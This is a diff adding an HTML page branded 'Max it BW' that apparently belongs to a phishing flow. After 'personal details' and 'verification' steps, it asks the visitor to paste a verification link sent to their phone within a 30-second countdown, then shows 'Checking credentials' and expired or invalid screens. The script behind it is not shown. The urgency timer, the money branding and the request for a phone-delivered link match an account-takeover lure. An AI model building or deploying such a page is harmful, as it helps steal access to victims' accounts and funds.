@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Link Verification - Max it BW</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+
+<body class="app-page">
+    <div class="app-container">
+        <!-- Header -->
+        <div class="app-header">
+            <div class="logo-small">💰 Max it BW</div>
+            <div class="security-indicator">
+                <span class="lock-icon">🔒</span>
+                <span>Link Verification</span>
+            </div>
+        </div>
+
+        <!-- Progress Bar -->
+        <div class="progress-wrapper">
+            <div class="progress-steps">
+                <div class="step-item completed">
+                    <div class="step-circle">✓</div>
+                    <span>Personal Details</span>
+                </div>
+                <div class="step-line completed"></div>
+                <div class="step-item completed">
+                    <div class="step-circle">✓</div>
+                    <span>Verification</span>
+                </div>
+                <div class="step-line active"></div>
+                <div class="step-item active">
+                    <div class="step-circle">3</div>
+                    <span>Approval</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Link Entry Screen -->
+        <div id="linkScreen" class="form-card">
+            <div class="otp-header">
+                <div class="otp-icon">🔗</div>
+                <h1 class="form-title">Paste Verification Link</h1>
+                <p class="form-subtitle">A verification link was sent to <strong id="maskedPhone">****</strong></p>
+            </div>
+
+            <div class="countdown-box">
+                <div class="countdown-circle">
+                    <svg class="countdown-svg" viewBox="0 0 100 100">
+                        <circle class="countdown-bg" cx="50" cy="50" r="45"></circle>
+                        <circle class="countdown-progress" cx="50" cy="50" r="45" id="countdownCircle"></circle>
+                    </svg>
+                    <div class="countdown-text">
+                        <span class="countdown-number" id="countdown">30</span>
+                        <span class="countdown-label">seconds</span>
+                    </div>
+                </div>
+                <p class="countdown-message">Link expires in <strong id="timeRemaining">30s</strong></p>
+            </div>
+
+            <div class="link-input-container">
+                <div class="link-input-wrapper">
+                    <input 
+                        type="text" 
+                        class="link-input" 
+                        id="verificationLink" 
+                        placeholder="Paste verification link here..."
+                        autofocus
+                    >
+                    <span class="paste-hint">Ctrl+V (Windows) or Cmd+V (Mac) to paste</span>
+                </div>
+            </div>
+
+            <button id="verifyLinkBtn" class="submit-button">
+                Verify Link
+                <span class="arrow">→</span>
+            </button>
+
+            <div class="resend-section">
+                <p class="resend-text">Didn't receive the link?</p>
+                <button class="link-button" id="resendBtn" disabled>
+                    Resend Link <span id="resendTimer">(30s)</span>
+                </button>
+            </div>
+
+            <div class="info-box">
+                <p><strong>Why do we need this?</strong></p>
+                <p>Link verification ensures you have access to the phone number you provided and helps prevent fraud.</p>
+            </div>
+        </div>
+
+        <!-- Processing Link Screen -->
+        <div id="processingLinkScreen" class="form-card" style="display: none;">
+            <div class="processing-content">
+                <div class="spinner-large"></div>
+                <h2 class="processing-title">Verifying Your Link</h2>
+                <p class="processing-text">Please wait while we verify your link...</p>
+                
+                <div class="status-box">
+                    <span class="status-dot"></span>
+                    <span>Checking credentials...</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Expired Screen -->
+        <div id="expiredScreen" class="form-card" style="display: none;">
+            <div class="result-content">
+                <div class="result-icon warning">⏰</div>
+                <h2 class="result-title">Link Expired</h2>
+                <p class="result-text">Your verification link has expired for security reasons.</p>
+                <button class="submit-button" onclick="requestNewLink()">
+                    Request New Link
+                </button>
+            </div>
+        </div>
+
+        <!-- Rejection Screen -->
+        <div id="rejectionScreen" class="form-card" style="display: none;">
+            <div class="result-content">
+                <div class="result-icon error">✕</div>
+                <h2 class="result-title">Invalid Link</h2>
+                <p class="result-text">The verification link you entered is invalid.</p>
+                <button class="submit-button" onclick="location.reload()">
+                    Try Again
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script src="otp-script.js"></script>
+</body>
+</html>
